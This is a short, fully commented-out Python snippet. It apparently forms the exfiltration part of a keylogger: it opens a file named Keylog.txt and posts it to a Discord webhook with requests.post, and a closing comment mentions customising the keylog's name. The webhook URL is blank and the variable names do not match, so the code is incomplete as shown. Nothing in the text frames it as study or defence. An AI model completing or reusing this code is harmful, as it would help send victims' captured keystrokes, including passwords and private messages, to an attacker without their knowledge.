# import requests

# WEBHOOK_URL = ""
# FILE = Keylog.txt


# # Replace this with the path to your file


# # Open the file and send it to Discord
# with open(file_path, "rb") as f:
#     files = {
#         "file": (file_path, f)
#     }
#     data = {
#         "content": "Here is the file you requested!"  # Optional message
#     }
#     response = requests.post(webhook_url, data=data, files=files)

# # Check response
# if response.status_code == 204:
#     print("File sent successfully!")
# else:
#     print(f"Failed to send file: {response.status_code} - {response.text}")


# # ADD CUSTOM NAME TO THE KEYLOG.txt